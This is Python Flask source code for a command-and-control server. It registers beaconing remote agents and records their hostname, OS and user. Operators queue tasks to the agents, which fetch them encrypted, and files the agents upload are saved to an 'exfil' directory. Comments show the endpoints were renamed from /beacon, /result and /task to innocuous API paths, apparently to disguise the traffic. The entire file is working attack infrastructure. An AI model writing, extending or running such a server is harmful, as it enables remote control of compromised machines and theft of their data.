from flask import Flask, request, jsonify, render_template, redirect, url_for
from common.cryptography_helpers import encrypt_string, decrypt_string
from server.auth import require_operator, require_agent, check_credentials, create_token
from server.db import init_db
init_db()
import time
import os
import base64
import json

app = Flask(__name__)

tasks = {}  # in-memory task list
agents = {}
AGENT_TIMEOUT = 60

# Simple in-memory rate limiter for /api/login
_login_attempts: dict[str, list[float]] = {}
LOGIN_MAX_ATTEMPTS = 10
LOGIN_WINDOW_SECONDS = 60

EXFIL_DIR = "exfil"
os.makedirs(EXFIL_DIR, exist_ok = True)


@app.route('/')
def dashboard():
    return render_template('index.html')


@app.route('/login')
def login_page():
    return render_template('login.html')


@app.route('/api/login', methods=['POST'])
def api_login():
    ip = request.remote_addr
    now = time.time()
    attempts = _login_attempts.setdefault(ip, [])
    # Drop attempts outside the window
    _login_attempts[ip] = [t for t in attempts if now - t < LOGIN_WINDOW_SECONDS]
    if len(_login_attempts[ip]) >= LOGIN_MAX_ATTEMPTS:
        return jsonify({"error": "Too many login attempts"}), 429
    _login_attempts[ip].append(now)

    data = request.json or {}
    username = data.get('username', '').strip()
    password = data.get('password', '')
    if not username or not password:
        return jsonify({"error": "Username and password required"}), 400
    if not check_credentials(username, password):
        return jsonify({"error": "Invalid credentials"}), 401
    return jsonify({"token": create_token(username)})


@app.route('/api/tasks', methods=['GET'])
@require_operator
def list_tasks():
    agent_id = request.args.get('agent_id')
    if agent_id:
        return jsonify(tasks.get(agent_id, []))
    return jsonify(tasks)


@app.route('/api/status', methods=['POST']) # old /beacon
@require_agent
def status():
    data = request.json
    agent_id = request.json.get('id')
    meta = data.get('meta', {})
    
    if not agent_id:
        return jsonify({"error": "missing id"}), 400
    
    agents[agent_id] = {
        "hostname" : meta.get("hostname"),
        "os" : meta.get("os"),
        "user" : meta.get("user"),
        "last_seen" : time.time()
    }
    
    pending = [t for t in tasks.get(agent_id, []) if t["status"] == "queued"]
    if pending:
        task_entry = pending[0]
        task_entry["status"] = "delivered"
        task_entry["delivered_at"] = time.time()
        encrypted_task = encrypt_string(task_entry["task"])
        return jsonify({"task": encrypted_task})
    else:
        return jsonify({"task": None})
    
    
@app.route('/api/upload', methods=['POST']) # old /result
@require_agent
def result():
    agent_id = request.json.get('id')
    output = request.json.get('output')
    MAX_EXFIL_SIZE = 5 * 1024 * 1024 # 5 MB Max
    try:
            plaintext = decrypt_string(output)
            data = json.loads(plaintext)
            task_id = data.get("task_id")
            
            for entry in tasks.get(agent_id, []):
                    if entry["task_id"] == task_id:
                        entry["status"] = "completed"
                        entry["result"] = data
                        entry["completed_at"] = time.time()
                        break
     
            if data.get("status") == "success" and "data" in data and "filename" in data:
                
                encoded_data = data["data"]
                
                if len(encoded_data) > MAX_EXFIL_SIZE * 2 :
                    print("[!] Exfil rejected: encoded payload too large")
                    return jsonify({"status": "received"})
                

                file_bytes = base64.b64decode(encoded_data, validate=True)
                if len(file_bytes) > MAX_EXFIL_SIZE:
                    print("[!] Exfil rejected: file too large")
                    return jsonify({"status": "received"}) 
                
                
                filename = os.path.basename(data["filename"])
                save_path = os.path.join(EXFIL_DIR, f"{agent_id}_{filename}")
                
                
                with open(save_path, "wb") as f:
                    f.write(file_bytes)
                    
                print(f"[+] Exfil saved to {save_path}")
            else:
                print(f"[+] Result from {agent_id} : {data}")
    except Exception as e:
        print(f"[!] Upload processing failed: {e}")
    return jsonify({"status": "received"})


@app.route('/api/tasks', methods=['DELETE'])
@require_operator
def clear_tasks():
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({"error": "missing agent_id"}), 400
    tasks[agent_id] = []
    return jsonify({"status": "cleared"})


@app.route('/api/push', methods=['POST']) # old /task
@require_operator
def push_task():
    data = request.json
    agent_id = data.get('id')
    task = data.get('task')
    
    if not agent_id or not task:
        return jsonify({"error": "Missing id or task"}), 400
    
    if agent_id not in agents:
        return jsonify({"error": "Unknown agent"}), 404
    
    MAX_TASKS_PER_AGENT = 100
    queue = tasks.setdefault(agent_id, [])
    if len(queue) >= MAX_TASKS_PER_AGENT:
        return jsonify({"error": "Task Queue Full"}), 429
    
    try: 
        parsed = json.loads(task)
    except json.JSONDecodeError:
        return jsonify({"error": "Task must be valid JSON"}), 400

    if "type" not in parsed:
        return jsonify({"error": "Task missing 'type' field"}), 400
    
    task_id = parsed.get("task_id")
    
    task_entry = {
        "task_id" : task_id, 
        "task" : task,
        "status" : "queued",
        "result" : None,
        "created_at" : time.time()
    }
    
    queue.append(task_entry)
 
    return jsonify({"status": "task queued", "task_id" : task_id})


@app.route('/api/agents', methods = ['GET'])
@require_operator
def list_agents():
    current_time = time.time()
    enriched_agents = {}
    
    for agent_id, meta in agents.items():
        last_seen = meta.get("last_seen", 0)
        status = "online" if current_time - last_seen <= AGENT_TIMEOUT else "offline"
        enriched_agents[agent_id] = {
            **meta,
            "status" : status
        }
    return jsonify(enriched_agents)
        
         
        
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000) 



    
  




